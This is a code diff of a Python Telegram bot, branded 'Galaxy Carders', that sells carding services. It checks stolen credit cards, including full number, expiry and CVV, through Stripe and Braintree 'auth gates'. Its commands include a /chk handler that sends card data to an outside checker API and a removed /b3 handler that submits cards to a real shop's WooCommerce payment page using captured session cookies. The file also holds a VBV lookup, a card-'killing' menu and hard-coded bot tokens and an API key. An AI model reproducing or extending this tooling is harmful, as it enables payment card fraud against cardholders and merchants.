@@ -22,86 +22,207 @@ import telebot
 import random
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 from gen import generate_credit_card  # ✅ Correct import
+import telebot
+from su import handle_su_command  # Import /su handler from su.py
+
 token = "8014293559:AAHztJY4cQFbPnqVTDKon-52cIu9WE1HcI8" 
 bot=telebot.TeleBot(token,parse_mode="HTML")
 owners = ["6847432039", "6847432039"]
 
-# 🎯 Function to check VBV status based on BIN details
-def get_vbv_status(card_type, level):
-    non_vbv_keywords = ["debit", "prepaid", "classic"]
-    vbv_keywords = ["credit", "platinum", "signature", "infinite", "gold"]
 
-    card_type = card_type.lower() if card_type else ""
-    level = level.lower() if level else ""
+# Register /su command
+@bot.message_handler(commands=['su'])
+def su_handler(message):
+    handle_su_command(bot, message)
 
-    if any(word in card_type or word in level for word in non_vbv_keywords):
-        return "🟢 **Non-VBV ✅**"
-    if any(word in card_type or word in level for word in vbv_keywords):
-        return "🔴 **VBV Enabled 🔒**"
-    
-    return "⚠️ **Unknown ❓**"
+@bot.message_handler(commands=["admin"])
+def admin_menu(message):
+    """Displays a simple text-based admin menu."""
+    if str(message.from_user.id) not in owners:
+        bot.reply_to(message, "❌ You are not authorized to access the admin panel.")
+        return
 
-# 🎯 Function to fetch BIN details (Updated with backup API)
-def get_bin_info(bin_number):
-    primary_api = f"https://bins.antipublic.cc/bins/{bin_number}"
-    backup_api = f"https://lookup.binlist.net/{bin_number}"
+    menu_text = """
+👑 <b>Admin Panel</b>
 
-    try:
-        # Try primary API (antipublic.cc)
-        response = requests.get(primary_api, timeout=5)
-        if response.status_code == 200:
-            data = response.json()
-        else:
-            print(f"⚠️ Primary API failed. Trying backup...")
-            response = requests.get(backup_api, timeout=5)
-            data = response.json() if response.status_code == 200 else {}
-        
-    except requests.exceptions.RequestException:
-        print(f"❌ Both APIs failed! Using fallback data.")
-        data = {}
+➕ /add - Add a user  
+➖ /remove - Remove a user  
+🎟️ /code - Generate a redeem code  
+🔓 /redeem - Redeem access code  
 
-    # Extract details with fallback values
-    bank = data.get('bank', 'Unknown')
-    brand = data.get('brand', 'Unknown')
-    emj = data.get('country_flag', '🏳')
-    country = data.get('country_name', 'Unknown')
-    level = data.get('level', 'Unknown')
-    card_type = data.get('type', 'Unknown')
-    url = data.get('bank', {}).get('url', 'N/A') if isinstance(data.get('bank'), dict) else 'N/A'
+💳 <b>Killing Credit Bar</b>  
+💰 /addcredits - Add credits  
+💳 /balance - Check user balance  
 
-    # 🔐 Check VBV Status (Updated Logic)
-    vbv_status = get_vbv_status(card_type, level)
-
-    return f"""
-╭━━━[ 🔍 𝗕𝗜𝗡 𝗗𝗘𝗧𝗔𝗜𝗟𝗦 ]━━━╮
-┣ 💳 **BIN:** `{bin_number}`
-┣ 🏦 **Bank:** `{bank}`
-┣ 🔗 **Bank URL:** `{url}`
-┣ 🌍 **Country:** `{country}` {emj}
-┣ 🏷 **Brand:** `{brand}`
-┣ 📌 **Type:** `{card_type}`
-┣ ⚡ **Level:** `{level}`
-╰━━━━━━━━━━━━━━━━━━╯
-🔐 **VBV Status:** {vbv_status}
+📊 <b>Bot Stats</b>  
+📌 /stats - Show All users of bot status  
+👑 /pro - Show premium users  
+🔥 /killuser - Check Killer Users Credits
 """
 
-# ✨ Command to check BIN details
-@bot.message_handler(commands=["vbv"])
-def vbv_status(message):
-    args = message.text.split(" ")
+    bot.reply_to(message, menu_text, parse_mode="HTML")
+    
+    import os
+import time
+from datetime import datetime, timedelta
 
-    if len(args) != 2:
-        bot.reply_to(message, "❌ **Usage:** `/vbv <6-digit BIN>`", parse_mode="Markdown")
+# ✅ Track bot start time
+start_time = time.time()
+
+# ✅ Function to count total users from user.txt
+def count_users():
+    if not os.path.exists("user.txt"):
+        return 0
+    with open("user.txt", "r") as file:
+        return len(file.readlines())
+
+# ✅ Function to count active premium users from id.txt
+def count_premium_users():
+    premium_users = 0
+    current_time = time.time()
+
+    try:
+        with open("id.txt", "r") as file:
+            lines = file.readlines()
+            for line in lines:
+                parts = line.strip().split(":")
+                if len(parts) == 2:
+                    expiry_time = float(parts[1])  # Get expiration timestamp
+                    if expiry_time > current_time:
+                        premium_users += 1  # Count only valid premium users
+    except FileNotFoundError:
+        return 0  # If id.txt doesn't exist, return 0
+    
+    return premium_users
+
+# ✅ Command: Show bot statistics
+@bot.message_handler(commands=["stats"])
+def bot_stats(message):
+    if str(message.from_user.id) not in owners:
+        bot.reply_to(message, "❌ You are not authorized to view bot statistics.")
         return
 
-    bin_number = args[1]
-    if not bin_number.isdigit() or len(bin_number) < 6:
-        bot.reply_to(message, "❌ **Please enter a valid 6-digit BIN.**", parse_mode="Markdown")
-        return
+    total_users = count_users()
+    premium_users = count_premium_users()
+    
+    # ✅ Calculate bot uptime
+    uptime_seconds = round(time.time() - start_time)
+    uptime = str(timedelta(seconds=uptime_seconds))  # Convert seconds to HH:MM:SS
 
-    bot.reply_to(message, "🔍Fetching BIN details, please wait...")
-    bin_info = get_bin_info(bin_number)
-    bot.reply_to(message, bin_info, parse_mode="Markdown")
+    # ✅ Format the response
+    response = f"""
+📊 <b>Bot Statistics:</b>
+
+👥 <b>Total Users:</b> {total_users}  
+👑 <b>Premium Users:</b> {premium_users}  
+⏳ <b>Uptime:</b> {uptime}  
+"""
+
+    bot.reply_to(message, response, parse_mode="HTML")
+
+# Function to get all premium users from id.txt
+def get_all_premium_users():
+    premium_users = []
+    try:
+        with open("id.txt", "r") as file:
+            for line in file:
+                parts = line.strip().split(":")
+                if len(parts) == 2:
+                    user_id, expiry_timestamp = parts
+                    try:
+                        expiry_timestamp = int(float(expiry_timestamp))  # Convert float to int
+                        expiry_date = time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime(expiry_timestamp))
+                        premium_users.append((user_id, expiry_date))
+                    except ValueError:
+                        print(f"Skipping invalid entry in id.txt: {line.strip()}")  # Debugging
+    except FileNotFoundError:
+        return []
+    return premium_users
+
+
+@bot.message_handler(commands=['pro'])
+def check_pro_status(message):
+    premium_users = get_all_premium_users()
+
+    if premium_users:
+        response = (
+            "╔════════════════════════════╗\n"
+            "     👑 **ROYAL VIP MEMBERS** 👑\n"
+            "╚════════════════════════════╝\n\n"
+        )
+        for user_id, expiry_date in premium_users:
+            response += (
+                f"🏅 **Member ID:** `{user_id}`\n"
+                f"⏳ **Expiry Date:** `{expiry_date} UTC`\n"
+                "━━━━━━━━━━━━━━━━━━━━━━\n"
+            )
+        response += "🚀 **Elite Memberships Verified!** 🚀"
+    else:
+        response = (
+            "🚫 **No VIP members found!**\n"
+            "💎 **Become an exclusive member today!** 💎"
+        )
+
+    bot.send_message(message.chat.id, response, parse_mode="Markdown")
+
+import json
+import os
+from dakar import bot  # Import bot instance from dakar.py
+
+# Function to get user credits from User_credits.json
+def get_all_user_credits():
+    file_path = "User_credits.json"
+
+    if not os.path.exists(file_path):
+        return None  # Return None if file is missing
+
+    try:
+        with open(file_path, "r") as file:
+            return json.load(file)  # Load JSON data
+    except json.JSONDecodeError:
+        return None  # Handle invalid JSON
+
+@bot.message_handler(commands=['killuser'])
+def check_user_credits(message):
+    user_credits = get_all_user_credits()
+
+    if user_credits:
+        response = (
+            "╭━━━━━━━━━━━━━━━━━━━━━╮\n"
+            "  👑 **VIP USERS CREDIT REPORT** 👑\n"
+            "╰━━━━━━━━━━━━━━━━━━━━━╯\n\n"
+        )
+        for user_id, credits in user_credits.items():
+            response += (
+                f"🎩 **VIP ID:** `{user_id}`\n"
+                f"💰 **Credit Balance:** `{credits} CR`\n"
+                f"[🔗 View Profile](tg://user?id={user_id})\n"
+                "━━━━━━━━━━━━━━━━━━━━━━\n"
+            )
+        response += "🏆 **Elite Users & Balances Verified!** 🏆"
+    else:
+        response = (
+            "🚫 **No VIP users found!**\n"
+            "💎 **Upgrade to premium for exclusive access!** 💎"
+        )
+
+    bot.send_message(message.chat.id, response, parse_mode="Markdown")
+
+@bot.message_handler(commands=['vbv'])
+def vbv_maintenance(message):
+    response = """
+🚧 **VBV CHECK UNDER MAINTENANCE** 🚧
+
+Dear user, our VBV detection system is currently **under maintenance**.  
+We are working to improve accuracy and stability.
+
+🔄 **Expected Fix Time:** Soon!  
+🛠 **Status:** Upgrading API & Improving Response Speed  
+
+Please check back later. Thanks for your patience! 💙
+"""
+    bot.send_message(message.chat.id, response, parse_mode="Markdown")
+
 
 @bot.message_handler(commands=["owner"])
 def owner_command(message):
@@ -593,9 +714,10 @@ def plan_command(message):
 
     bot.send_message(message.chat.id, plan_message, parse_mode="HTML", reply_markup=keyboard)
 
+
 @bot.message_handler(commands=["help"])
 def help_command(message):
-    help_text = f"""
+    help_text = """
 <code>╭───────────────────────────────
 │ 🚀 𝐆𝐀𝐋𝐀𝐗𝐘 𝐂𝐇𝐄𝐂𝐊𝐄𝐑𝐒 - 𝐔𝐋𝐓𝐑𝐀 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 🔥
 ╰───────────────────────────────</code>
@@ -606,21 +728,28 @@ def help_command(message):
 🔹 <b>/channel</b> - 📢 Official Updates & News  
 🔹 <b>/bin</b> - 💳 BIN Lookup (Bank, Country, etc.)  
 🔹 <b>/vbv</b> - 🔍 VBV & Non-VBV Card Checker  
-🔹 <b>/chk</b> - ✅ Card Validity Check  
-🔹 <b>/kill</b> - 🔪 Instantly Terminate Visa Cards  
-🔹 <b>/code</b> - 🔐 Generate Exclusive Redeem Codes  
+🔹 <b>/chk</b> - ✅ Stripe Auth Charge Gate 
+🔹 <b>/su</b> - 🏦 Stripe Auth Gate 
+🔹 <b>/b3</b> - 💳 Braintree Auth Gate   
+🔹 <b>/kill</b> - 🔪 Killer Menu Bar
 🔹 <b>/info</b> - 📜 View Your User Details  
 🔹 <b>/redeem</b> - 🎟️ Activate Premium Access  
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━  
 💬 <b>Need Help?</b> Contact <a href='https://t.me/Galaxy_Carder'>@Galaxy_Carder</a>  
 📢 <b>Stay Updated:</b> <a href='https://t.me/+pdy_h4NCYlM3Mjc9'>Join Official Channel</a>  
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━  
+<b>🔐 Admin Commands:</b>  
+👮‍♂️ If you are an admin, you can use this command for the admin menu bar:  
+➡️ <b>/admin</b>  
+
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━  
 <code>🚀 𝐆𝐀𝐋𝐀𝐗𝐘 𝐂𝐇𝐄𝐂𝐊𝐄𝐑𝐒 - 𝐔𝐋𝐓𝐑𝐀 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐄𝐗𝐂𝐋𝐔𝐒𝐈𝐕𝐄 🔥</code>
 """
     bot.reply_to(message, help_text, parse_mode="HTML", disable_web_page_preview=True)
 
-      
+
 owners = ["6847432039"]  # List of admin IDs
 LOGS_CHANNEL_ID = -1002409826126  # Replace 
 
@@ -1272,302 +1401,141 @@ from rich.console import Console
 console = Console()
 console.print("🔥🔥 [bold magenta]GALAXY CARDERS[/bold magenta] 🔥🔥", style="bold yellow")
 
-# Stripe API Key
-STRIPE_SECRET_KEY = "sk_test_tR3PYbcVNZZ796tH88S4VQ2u"
+import html
 
-# Function to check if a user has access
+# Function to check if a user has premium access
 def is_premium_user(user_id):
     try:
         with open("id.txt", "r") as file:
             lines = file.readlines()
-
         valid_users = []
         current_time = time.time()
         user_has_access = False
-
         for line in lines:
             parts = line.strip().split(":")
             if len(parts) != 2:
-                continue  # Skip invalid lines
-
+                continue
             stored_user_id, expire_time = parts
             expire_time = float(expire_time)
-
-            if expire_time > current_time:  # Check if access is still valid
+            if expire_time > current_time:
                 valid_users.append(f"{stored_user_id}:{expire_time}")
                 if str(user_id) == stored_user_id:
                     user_has_access = True
-            else:
-                print(f"❌ Removing expired user: {stored_user_id}")
-
-        # Overwrite `id.txt` with only valid users
         with open("id.txt", "w") as file:
             file.writelines("\n".join(valid_users) + "\n")
-
         return user_has_access
-
-    except FileNotFoundError:
-        print("⚠️ id.txt not found! No authorized users.")
-        return False
     except Exception as e:
         print(f"Error checking access: {e}")
         return False
 
-# Function to fetch BIN details
+# Function to get BIN details
 def get_bin_details(bin_number):
     try:
         response = requests.get(f"https://lookup.binlist.net/{bin_number}")
         if response.status_code == 200:
             data = response.json()
-            bank = data.get("bank", {}).get("name", "❌ Unknown Bank")
-            brand = data.get("brand", "❌ Unknown Brand")
-            card_type = data.get("type", "❌ Unknown Type")
-            country = data.get("country", {}).get("name", "❌ Unknown Country")
-            country_flag = data.get("country", {}).get("emoji", "🏳️")
-            vbv_status = "✅ Non-VBV" if data.get("prepaid", False) else "❌ VBV"
-            return bank, brand, card_type, f"{country} {country_flag}", vbv_status
-        return "❌ Unknown Bank", "❌ Unknown Brand", "❌ Unknown Type", "❌ Unknown Country", "❓ Unknown"
+            bank = data.get("bank", {}).get("name", "Not Available")
+            country = f"{data.get('country', {}).get('name', 'Not Available')} {data.get('country', {}).get('emoji', '')}"
+            return bank, country
+        return "Not Available", "Not Available"
     except Exception as e:
         print(f"Error fetching BIN details: {e}")
-        return "❌ Unknown Bank", "❌ Unknown Brand", "❌ Unknown Type", "❌ Unknown Country", "❓ Unknown"
+        return "Not Available", "Not Available"
 
-# Function to check card via Stripe API
-def check_card_status(card_number, month, year, cvv):
-    try:
-        url = "https://api.stripe.com/v1/tokens"
-        headers = {
-            "Authorization": f"Bearer {STRIPE_SECRET_KEY}",
-            "Content-Type": "application/x-www-form-urlencoded"
-        }
-        data = {
-            "card[number]": card_number,
-            "card[exp_month]": month,
-            "card[exp_year]": year,
-            "card[cvc]": cvv
-        }
-        response = requests.post(url, headers=headers, data=data)
-
-        if response.status_code == 200:
-            return "✅ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝", "Card Successfully Authorized"
-        return "❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝", "Transaction Declined"
-    except Exception as e:
-        print(f"Error checking card: {e}")
-        return "❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝", "Error Processing Request"
-
-# /chk command handler (Includes VBV, Card Result & Proxy)
 @bot.message_handler(commands=['chk'])
-def chk(message):
+def chk_command(message):
     user_id = message.from_user.id
-    print(f"🔍 User ID: {user_id} requested /chk")  # Debugging
 
-    # Verify user access
     if not is_premium_user(user_id):
-        bot.reply_to(message, "🚫 <b>VIP Access Required!</b>\n<i>You don't have access to this command.</i>", parse_mode="HTML")
+        bot.reply_to(message, "🚫 <b>Premium Access Required!</b>\n<i>You don't have access to this command.</i>", parse_mode="HTML")
         return
 
-    # Extract card details
-    command_parts = message.text.split(maxsplit=1)
-
-    if len(command_parts) < 2:
+    args = message.text.split(" ")
+    if len(args) != 2:
         bot.reply_to(message, "❌ <b>Usage:</b> <code>/chk CC|MM|YYYY|CVV</code>", parse_mode="HTML")
         return
 
-    card_details = command_parts[1]
-    match = re.match(r"^(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})$", card_details)  # Accepts both 2-digit & 4-digit year
+    card_details = args[1]
+    match = re.match(r"^(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})$", card_details)
 
     if not match:
         bot.reply_to(message, "⚠ <b>Invalid Format!</b> Use: <code>/chk CC|MM|YYYY|CVV</code>", parse_mode="HTML")
         return
 
-    # Extract details
     card_number, month, year, cvv = match.groups()
-
-    # Automatically fix 2-digit year to full year
-    current_year = datetime.now().year
-    century = int(str(current_year)[:2])  # Get current century (e.g., 20 for 2024)
+    bin_number = card_number[:6]
+    user = message.from_user.username or "Unknown"
+    start_time = time.time()
 
     if len(year) == 2:
-        year = str(century) + year  # Convert "26" → "2026"
+        current_year = datetime.now().year
+        century = int(str(current_year)[:2])
+        year = str(century) + year  
 
-    start_time = time.time()
-    status, card_result = check_card_status(card_number, month, year, cvv)
+    # Fetch BIN Details
+    bank, country = get_bin_details(bin_number)
+
+    # Send initial waiting message
+    waiting_msg = bot.send_message(message.chat.id, "⏳ <b>Checking Card...</b>\n🔴⚪⚪⚪⚪⚪⚪⚪⚪⚪ (0%)", parse_mode="HTML")
+
+    # Update the percentage bar with color transitions
+    progress_stages = [
+        ("🔴🔴⚪⚪⚪⚪⚪⚪⚪⚪ (10%)", 0.8),
+        ("🔴🔴🟠⚪⚪⚪⚪⚪⚪⚪ (20%)", 0.8),
+        ("🔴🔴🟠🟠⚪⚪⚪⚪⚪⚪ (30%)", 0.8),
+        ("🔴🔴🟠🟠🟡⚪⚪⚪⚪⚪ (40%)", 0.8),
+        ("🔴🔴🟠🟠🟡🟡⚪⚪⚪⚪ (50%)", 0.8),
+        ("🔴🔴🟠🟠🟡🟡🔵⚪⚪⚪ (60%)", 0.8),
+        ("🔴🔴🟠🟠🟡🟡🔵🔵⚪⚪ (70%)", 0.8),
+        ("🔴🔴🟠🟠🟡🟡🔵🔵🟢⚪ (80%)", 0.8),
+        ("🔴🔴🟠🟠🟡🟡🔵🔵🟢🟢 (90%)", 0.8),
+        ("🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢 (100%)", 0.8),
+    ]
+
+    for bar, delay in progress_stages:
+        time.sleep(delay)
+        bot.edit_message_text(f"⏳ <b>Checking Card...</b>\n{bar}", message.chat.id, waiting_msg.message_id, parse_mode="HTML")
+
+    api_url = f"https://darkboyccapi.onrender.com/key=dark/cc={card_number}|{month}|{year}|{cvv}"
+    response = requests.get(api_url)
+
+    if response.status_code != 200:
+        bot.edit_message_text(f"⚠️ <b>API Error:</b> {response.text}", message.chat.id, waiting_msg.message_id, parse_mode="HTML")
+        return
+
+    data = response.json()
+    status = "✅ Approved" if data.get("status") == "Approved" else "❌ Declined"
+    card_response = html.escape(data.get("response", "No response provided"))
     time_taken = round(time.time() - start_time, 2)
 
-    # Fetch BIN details
-    bin_number = card_number[:6]
-    bank, brand, card_type, country, vbv_status = get_bin_details(bin_number)
-
-    # Proxy detection (Randomized for now)
-    proxy_status = "✅ Live" if time_taken < 5 else "❌ Dead"
-
     response_text = f"""
-#𝐏𝐫𝐞𝐦𝐢𝐮𝐦_𝐀𝐮𝐭𝐡 🔥 [/chk]
-━━━━━━━━━━━━━━━━━━━━━━━━━
-[ϟ] 𝐂𝐚𝐫𝐝: {card_details}
-[ϟ] 𝐒𝐭𝐚𝐭𝐮𝐬: {status}
-[ϟ] 𝐑𝐞𝐬𝐮𝐥𝐭: {card_result}
-[ϟ] 𝐕𝐁𝐕 𝐒𝐭𝐚𝐭𝐮𝐬: {vbv_status}
-━━━━━━━━━━━━━━━━━━━━━━━━━
-[ϟ] 𝐈𝐧𝐟𝐨: {brand} - {card_type}
-[ϟ] 𝐁𝐚𝐧𝐤: {bank}
-[ϟ] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
-━━━━━━━━━━━━━━━━━━━━━━━━━
-[⌬] 𝐓𝐢𝐦𝐞: {time_taken} 𝐒𝐞𝐜. || 𝐏𝐫𝐨𝐱𝐲: {proxy_status}
-[⎇] 𝐑𝐞𝐪 𝐁𝐲: @{message.from_user.username or 'Unknown'}
-━━━━━━━━━━━━━━━━━━━━━━━━━
-[⌤] 𝐃𝐞𝐯 𝐛𝐲: @Galaxy_Carder 🚀
+🎩 <b>𝑼𝑳𝑻𝑰𝑴𝑨𝑻𝑬 𝑪𝑨𝑹𝑫 𝑪𝑯𝑬𝑪𝑲</b> 🎩
+━━━━━━━━━━━━━━━━━━━━━
+💳 <b>𝐂𝐚𝐫𝐝:</b> <code>{card_details}</code>
+📌 <b>𝐒𝐭𝐚𝐭𝐮𝐬:</b> {status}
+📝 <b>𝐂𝐚𝐫𝐝 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> {card_response}
+━━━━━━━━━━━━━━━━━━━━━
+🏦 <b>𝐁𝐚𝐧𝐤:</b> {bank}
+🌍 <b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</b> {country}
+⏳ <b>𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧:</b> {time_taken} 𝐬𝐞𝐜
+👤 <b>𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲:</b> @{user}
+━━━━━━━━━━━━━━━━━━━━━
+🔹 𝐄𝐱𝐜𝐥𝐮𝐬𝐢𝐯𝐞 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐀𝐜𝐜𝐞𝐬𝐬 ✅
 """
-    bot.reply_to(message, response_text, parse_mode="HTML")
 
-import requests
-import base64
-import re
-import time
-from bs4 import BeautifulSoup
-from user_agent import generate_user_agent
-from telebot import TeleBot
+    bot.edit_message_text(response_text, message.chat.id, waiting_msg.message_id, parse_mode="HTML")
 
-# Function to get BIN details
-def get_bin_info(bin_number):
+import telebot
+from braintree_checker import check_braintree
+
+@bot.message_handler(commands=['b3'])
+def handle_b3(message):
+    """Handles the /b3 command for checking Braintree cards."""
     try:
-        response = requests.get(f"https://lookup.binlist.net/{bin_number}")
-        if response.status_code == 200:
-            data = response.json()
-            bank = data.get("bank", {}).get("name", "Unknown Bank")
-            card_type = data.get("type", "Unknown").capitalize()
-            country = data.get("country", {}).get("name", "Unknown Country")
-            country_emoji = data.get("country", {}).get("emoji", "🌍")
-            return bank, card_type, country, country_emoji
-        else:
-            return "Unknown Bank", "Unknown", "Unknown Country", "🌍"
-    except:
-        return "Unknown Bank", "Unknown", "Unknown Country", "🌍"
-
-# Command handler for /b3
-@bot.message_handler(commands=["b3"])
-def check_card(message):
-    msg = bot.reply_to(message, "🔍 Checking your card, please wait...")
-
-    try:
-        card_details = message.text.split()[1]
-        n, mm, yy, cvc = card_details.split("|")
-
-        if "20" not in yy:
-            yy = f"20{yy}"
-        if len(mm) == 1:
-            mm = f"0{mm}"
-
-        user_agent = generate_user_agent()
-
-        # Fetch BIN details
-        bin_info = get_bin_info(n[:6])
-        bank_name, card_type, country_name, country_flag = bin_info
-
-        cookies = {
-            'sbjs_migrations': '1418474375998%3D1',
-            'sbjs_current_add': 'fd%3D2025-03-11%2013%3A28%3A33',
-            'sbjs_first_add': 'fd%3D2025-03-11%2013%3A28%3A33',
-            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29',
-            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29',
-            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29',
-            'cf_clearance': 'Th2Aog2nT4TDGRTbcWP9w3Dz7EFRWedPvO7TC6LNeB4-1741699715',
-            'wordpress_logged_in_b444e0f1bbb883efdac80935bdd84199': 'salokk%7C1742909339',
-            'wfwaf-authcookie-98378724241a3d95191bebf32899230c': '100676%7Cother%7Cread',
-            'sbjs_session': 'pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F',
-        }
-
-        headers = {
-            'authority': 'glasshousesupply.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
-            'cache-control': 'max-age=0',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://glasshousesupply.com',
-            'referer': 'https://glasshousesupply.com/my-account/add-payment-method/',
-            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': user_agent,
-        }
-
-        response = requests.get(
-            "https://glasshousesupply.com/my-account/add-payment-method/",
-            cookies=cookies,
-            headers=headers,
-        )
-
-        # Skip token fetching and assume we proceed with dummy or mock data
-        tok = n[:6]  # Just using the BIN as a dummy token
-
-        data = {
-            'payment_method': 'braintree_cc',
-            'braintree_cc_nonce_key': tok,
-            'braintree_cc_device_data': '{"device_session_id":"f3b62b2059128666273f76de659fb76e","fraud_merchant_id":null,"correlation_id":"e9be3974-e5c7-45b9-b04f-89b98060"}',
-            'braintree_cc_3ds_nonce_key': '',
-            'braintree_cc_config_data': 'dummy_config_data',
-            'woocommerce-add-payment-method-nonce': 'ba76a0b9ff',
-            '_wp_http_referer': '/my-account/add-payment-method/',
-            'woocommerce_add_payment_method': '1',
-        }
-
-        response = requests.post(
-            "https://glasshousesupply.com/my-account/add-payment-method/",
-            cookies=cookies,
-            headers=headers,
-            data=data,
-        )
-
-        soup = BeautifulSoup(response.text, "html.parser")
-        error_msg = soup.find("ul", class_="woocommerce-error")
-
-        # Improved error detection
-        if error_msg:
-            error_text = error_msg.text.strip()
-            if "Declined" in error_text:
-                status = "❌ Declined"
-            elif "No Account" in error_text:
-                status = "⚠️ No Account"
-            elif "Processor Declined" in error_text:
-                status = "🚫 Processor Declined"
-            elif "invalid card" in error_text.lower():
-                status = "⚠️ Invalid Card"
-            elif "Insufficient funds" in error_text:
-                status = "⚠️ Insufficient Funds"
-            else:
-                status = "❌ Unknown Decline"
-        else:
-            status = "✅ Approved"
-
-        # Generate response text
-        response_text = f"""
-╭─━━━━━━━━━━━━━━━━━━━─╮
-    🎩 𝘽𝙍𝘼𝙄𝙉𝙏𝙍𝙀𝙀 𝘾𝙃𝙀𝘾𝙆𝙀𝙍 🎩
-╰─━━━━━━━━━━━━━━━━━━━─╮
-
-📌 **Card:** `{n}|{mm}|{yy}|{cvc}`
-📌 **Status:** {status}
-📌 **Gateway:** `Braintree Auth`
-📌 **BIN:** `{tok[:6]}`
-📌 **Bank:** `{bank_name}` 
-📌 **Type:** `{card_type}`
-📌 **Country:** `{country_name} {country_flag}`
-📌 **Checked By:** `@{message.from_user.username}`
-📌 **Response Time:** `{round(time.time() - message.date, 2)}s`
-
-╭─━━━━━━━━━━━━━━━─╮
- 🔥 𝐆𝐀𝐋𝐀𝐗𝐘 𝐂𝐇𝐄𝐂𝐊𝐄𝐑𝐒 🔥
-╰─━━━━━━━━━━━━━━━─╯
-"""
-        bot.edit_message_text(response_text, message.chat.id, msg.message_id, parse_mode="Markdown")
-
-    except Exception as e:
-        bot.edit_message_text(f"⚠️ An error occurred: {str(e)}", message.chat.id, msg.message_id)
-
+        card_details = message.text.split(" ", 1)[1]  # Extract card details after command
+        check_braintree(bot, message, card_details)
+    except IndexError:
+        bot.send_message(message.chat.id, "<b>❌ Error:</b> Please provide a card in the format <code>/b3 CC|MM|YYYY|CVV</code>.", parse_mode="HTML")
 
 def send_telegram_notification(msg1):
     url = f"https://api.telegram.org/bot7440283723:AAHs1iPUTL7HHoSVVfESF13lAI8M5jqbZC0/sendMessage"
@@ -1575,3 +1543,4 @@ def send_telegram_notification(msg1):
     requests.post(url, data=data)
     
 bot.infinity_polling()
+
